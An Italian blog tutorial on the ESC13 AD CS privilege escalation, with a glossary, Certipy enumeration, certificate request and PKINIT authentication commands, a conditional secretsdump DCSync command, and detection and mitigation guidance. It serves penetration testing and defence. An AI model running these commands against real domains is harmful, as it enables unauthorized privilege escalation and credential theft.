---
title: 'ESC13 AD CS: Privesc con Issuance Policy OID e Certipy'
slug: esc13-adcs
description: 'Privilege escalation in Active Directory via ESC13: Certipy rileva Issuance Policy OID collegate a gruppi AD e spiega l''abuso dei privilegi via TGT Kerberos.'
image: /13.webp
draft: false
date: 2026-03-09T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ESC13
  - AD CS
  - Active Directory
  - Certipy
  - Kerberos
---

# ESC13 in Active Directory Certificate Services: Issuance Policy OID collegata a un gruppo AD

ESC13 è una tecnica di privilege escalation via AD CS basata su un meccanismo legittimo di Windows — l'**Authentication Mechanism Assurance (AMA)** — sfruttato quando è configurato male. A differenza di ESC1 o ESC4, qui non si tocca nessuna ACL né si modifica nessun utente: il certificato stesso diventa la prova di appartenenza a un gruppo.

Un glossario prima di entrare nel merito:

| Termine                                      | Cos'è, in una riga                                                                                                                                                                                                 |
| -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Issuance Policy**                          | Una "etichetta" (OID) che la CA può includere in un certificato per dichiarare sotto quali condizioni/garanzie è stato emesso.                                                                                     |
| **OID** (Object Identifier)                  | Una sequenza numerica standard che identifica univocamente qualcosa — qui, una issuance policy specifica.                                                                                                          |
| **AMA** (Authentication Mechanism Assurance) | La funzionalità Windows che collega una issuance policy a un gruppo AD: chi si autentica con un certificato che porta quella policy "riceve" l'appartenenza al gruppo per la durata della sessione Kerberos.       |
| **msDS-OIDToGroupLink**                      | L'attributo LDAP sull'oggetto OID che realizza il collegamento tra la issuance policy e il gruppo.                                                                                                                 |
| **Gruppo Universal**                         | Uno dei tre scope dei gruppi AD (insieme a Domain Local e Global), valido in tutta la foresta — è l'unico scope che AMA accetta per questo collegamento.                                                           |
| **PAC** (Privilege Attribute Certificate)    | La struttura dati dentro un ticket Kerberos che elenca i gruppi e i privilegi dell'utente autenticato.                                                                                                             |
| **TGT**                                      | Ticket Granting Ticket: il "biglietto" Kerberos ottenuto dopo l'autenticazione, usato per chiedere accesso ad altri servizi del dominio.                                                                           |
| **PKINIT**                                   | L'estensione Kerberos che permette di autenticarsi con un certificato invece che con una password.                                                                                                                 |
| **DCSync**                                   | Una tecnica che simula la replica di dominio per estrarre le credenziali di tutti gli account — richiede diritti specifici (`Replicating Directory Changes`), non è un effetto automatico di nessun'altra tecnica. |

***

# In cosa consiste il problema

Il flusso è questo:

1. Un certificate template include nel suo attributo `msPKI-Certificate-Policy` una issuance policy (un OID).
2. Nel container `CN=OID,CN=Public Key Services,CN=Services,CN=Configuration`, l'oggetto che rappresenta quell'OID ha l'attributo `msDS-OIDToGroupLink` valorizzato, collegandolo a un gruppo AD.
3. Quando la CA emette un certificato da quel template, il certificato porta l'OID nell'estensione **Certificate Policies** (OID standard `2.5.29.32`).
4. L'utente si autentica con PKINIT usando quel certificato.
5. Il KDC, durante la costruzione del PAC, legge l'OID nel certificato, verifica il collegamento `msDS-OIDToGroupLink` e **aggiunge il SID del gruppo collegato al PAC del TGT**.

**Punto tecnico che la maggior parte delle guide sbaglia:** il gruppo collegato tramite AMA deve avere obbligatoriamente scope **Universal** — Active Directory verifica questo requisito sia quando si imposta il collegamento sia quando si prova ad aggiungere membri al gruppo. `Domain Admins` ha scope **Global**, quindi **non può essere il gruppo collegato direttamente** in questo meccanismo — presentarlo come esempio diretto è tecnicamente sbagliato. Nella pratica, chi configura AMA crea un gruppo universale dedicato (spesso vuoto), e i privilegi reali derivano da cosa quel gruppo può fare — direttamente o tramite appartenenze/permessi a cascata.

**Secondo punto importante:** l'utente **non viene aggiunto come membro permanente** del gruppo. Il gruppo può restare vuoto per sempre: il SID viene iniettato nel PAC solo al momento dell'autenticazione con quel certificato specifico. Questo significa che controllare la membership del gruppo con `net group` o un semplice elenco membri **non rivela l'esposizione reale** — il rischio è nel collegamento OID→gruppo, non nella lista membri.

***

# Componenti necessari perché sia sfruttabile

* il template contiene una **Issuance Policy OID**
* quell'OID ha `msDS-OIDToGroupLink` verso un gruppo **Universal**
* il template permette **Client Authentication**
* l'attaccante ha **Enroll permission** sul template
* il gruppo collegato ha privilegi effettivi che valgono la pena — da verificare caso per caso, non da dare per scontato dal nome

***

# Identificazione

```bash
certipy find -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.100 -vulnerable -stdout
```

Output tipico:

```
Template Name: SecureAdminsAuthentication
Client Authentication: True
Issuance Policies: 1.3.6.1.4.1.311....
Linked Groups: CN=SecureAdmins,CN=Users,DC=CORP,DC=LOCAL
Enrollment Rights: Domain Users

[!] Vulnerabilities
ESC13 : Template allows client authentication and issuance policy linked to group
```

Indicatori chiave:

* presenza di **Issuance Policies**
* presenza di **Linked Groups**
* enrollment permesso a utenti non privilegiati

Questo basta per capire che la vulnerabilità *esiste*, ma non per sapere quanto sia grave: per quello serve guardare oltre il nome del gruppo.

### Non fermarti al nome del gruppo

Da qui, i passaggi che una guida seria non salta:

* verifica lo **scope** del gruppo collegato (`Get-ADGroup` o equivalente LDAP) — se non è Universal, qualcosa non torna nella configurazione o nell'enumerazione;
* controlla i **privilegi effettivi** del gruppo: diritti diretti, appartenenze annidate, permessi su risorse sensibili. Uno strumento di attack-path mapping (es. BloodHound) aiuta a capire se quel gruppo porta davvero verso Domain Admin o DCSync, invece di assumerlo dal nome;
* controlla anche le **ACL sull'oggetto OID** stesso: se un account può modificare `msDS-OIDToGroupLink` o le policy del template, quello è un percorso di escalation diverso (vicino a ESC4/ESC5 — "posso creare la condizione" invece di "la condizione esiste già") e va trattato come tale, non confuso con ESC13 puro.

***

# Exploitation

## Step 1 — Richiedere il certificato

```bash
certipy req \
-u attacker@corp.local -p 'Passw0rd!' \
-dc-ip 10.0.0.100 \
-target CA.CORP.LOCAL \
-ca CORP-CA \
-template SecureAdminsAuthentication
```

Output:

```
Successfully requested certificate
Saving certificate to attacker.pfx
```

`Successfully requested certificate` dice solo che la CA ha emesso qualcosa — non dimostra ancora che il certificato contenga davvero la policy attesa. Vale la pena controllare l'estensione Certificate Policies del certificato ottenuto prima di andare avanti, specialmente in un audit dove la precisione conta.

## Step 2 — Autenticazione con il certificato

```bash
certipy auth -pfx attacker.pfx -dc-ip 10.0.0.100
```

Output:

```
Got TGT
Saving credential cache to user.ccache
Got hash for attacker@corp.local
```

**`Got TGT` da solo non dimostra l'escalation.** Dice solo che PKINIT è andato a buon fine — non che il gruppo collegato abbia privilegi utili, né che DCSync o altro siano effettivamente possibili. Il TGT ottenuto va ispezionato per confermare che porti davvero il SID del gruppo atteso.

### Verificare i privilegi effettivi dopo PKINIT

Il passaggio che separa una demo da un walkthrough vero: confronta cosa può fare l'account *prima* di questa autenticazione e cosa può fare *con* il TGT ottenuto da PKINIT. Strumenti come Rubeus (`describe`) permettono di ispezionare il contenuto del PAC e confermare la presenza del SID del gruppo nel ticket, invece di darlo per scontato dall'output di Certipy.

## Step 3 — Uso del ticket privilegiato (condizionale)

```bash
export KRB5CCNAME=user.ccache
```

Se — e solo se — il gruppo collegato ha davvero diritti di replica sul dominio:

```bash
secretsdump.py -k -no-pass corp.local/user@dc.corp.local
```

Questo esempio **non è il risultato garantito** di ogni ESC13: è condizionato ai privilegi reali del gruppo collegato. Trattalo come un esempio di "cosa succede se il gruppo è quello", non come conseguenza automatica della tecnica.

***

# Impatto

Dipende interamente da cosa può fare il gruppo collegato. Nello scenario peggiore:

* Domain Admin
* DCSync
* accesso amministrativo su sistemi che fidano di quel gruppo

Nello scenario reale più comune, però, il gruppo potrebbe avere privilegi molto più limitati — da qui l'importanza di verificarlo invece di assumerlo.

***

# Detection

| Fonte                  | Cosa verificare                                                                                            |
| ---------------------- | ---------------------------------------------------------------------------------------------------------- |
| Template AD CS         | Issuance Policy incluse, EKU di autenticazione, permessi di enrollment                                     |
| Oggetto Enterprise OID | Valore dell'OID e attributo `msDS-OIDToGroupLink`                                                          |
| Gruppo collegato       | Scope (deve essere Universal), SID, permessi diretti e annidati                                            |
| Log eventi AD          | Modifiche a `msDS-OIDToGroupLink` (evento 5136, se l'auditing Directory Service Changes è abilitato)       |
| CA + Domain Controller | Correlazione tra emissione del certificato, autenticazione PKINIT e attività successive con quell'identità |

Due avvertenze importanti su questa detection:

* non tutte le condizioni ESC13 nascono da una modifica recente — la configurazione rischiosa può esistere da anni senza che nessuno l'abbia mai toccata, quindi l'assenza di un evento 5136 recente non significa che il rischio non ci sia;
* non aspettarti un evento di "aggiunta al gruppo": l'autorizzazione via AMA vive nel contesto Kerberos del singolo ticket, non in una modifica permanente della membership — per questo guardare solo i log di modifica gruppo non basta.

***

# Mitigation

In ordine di priorità:

1. **Rivedi ogni collegamento OID→gruppo esistente**: elimina quelli non più giustificati, e verifica che il gruppo universale collegato non porti a privilegi eccessivi (direttamente o tramite appartenenze annidate).
2. **Proteggi gli oggetti OID**: limita chi può modificare `msDS-OIDToGroupLink` e le ACL nel container `CN=OID,CN=Public Key Services,CN=Services,CN=Configuration`.
3. **Limita l'enrollment**: solo chi ha davvero bisogno di quella issuance policy dovrebbe poter fare enroll sul template collegato.
4. **Proteggi i template**: rivedi le ACL dei certificate template e chi può modificarne le policy.
5. **Separa le responsabilità**: chi amministra gruppi privilegiati non dovrebbe poter modificare liberamente le policy PKI, e viceversa — altrimenti un singolo account compromesso può creare la condizione da solo (territorio ESC4).

Manager approval e authorized signatures sui template sono misure aggiuntive utili, ma non sostituiscono la correzione dei collegamenti OID-gruppo pericolosi.

***

# Quando ESC13 non è sfruttabile

Vale la pena saperlo anche per non sprecare tempo in un assessment:

* la policy non compare effettivamente nel certificato emesso (template mal configurato diversamente da come enumerato);
* il TGT si ottiene ma il gruppo collegato non ha privilegi utili — l'autenticazione riesce, l'escalation no;
* il template è rilevato da Certipy come "potenzialmente" ESC13 ma il collegamento OID→gruppo non è più attivo o punta a un gruppo senza scope Universal (incoerenza da verificare, non da ignorare).

***

# FAQ — ESC13 ADCS

### Cos'è ESC13?

Una escalation basata sul meccanismo AMA: un certificato con una issuance policy collegata a un gruppo AD universale fa sì che il KDC aggiunga il SID di quel gruppo al TGT dell'utente che si autentica con quel certificato.

### Perché il gruppo collegato deve essere Universal?

Perché AD verifica questo requisito al momento della configurazione del collegamento — è un vincolo del meccanismo AMA stesso, non una scelta stilistica. Un gruppo Global o Domain Local non può essere collegato in questo modo.

### ESC13 aggiunge l'utente al gruppo in Active Directory?

No. L'appartenenza esiste solo nel PAC del ticket Kerberos ottenuto con quel certificato, per quella sessione — il gruppo in AD resta invariato, spesso vuoto.

### Qual è la differenza tra ESC13 ed ESC4?

ESC4 riguarda il poter *modificare* un template per renderlo vulnerabile (es. a ESC1). ESC13 riguarda lo sfruttare un collegamento OID→gruppo *già esistente* — se invece puoi modificare tu stesso `msDS-OIDToGroupLink` o le policy del template, sei di fatto in uno scenario più vicino a ESC4/ESC5.

### ESC13 garantisce sempre DCSync o Domain Admin?

No. Dipende interamente dai privilegi reali del gruppo collegato — vanno verificati caso per caso, non assunti dal nome del gruppo o del template.

***

Per il quadro completo delle escalation AD CS vedi la [guida ESC1-ESC16](/articoli/adcs-esc1-esc16/). Continua con [ESC14](/articoli/esc14-adcs/) (weak explicit certificate mapping via `altSecurityIdentities`) o [ESC15](/articoli/esc15-adcs/) (EKUwu, CVE-2024-49019).

Ricerca originale di riferimento: [ADCS ESC13 Abuse Technique — SpecterOps](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/). Tool usato in questa guida: [Certipy](https://github.com/ly4k/Certipy).
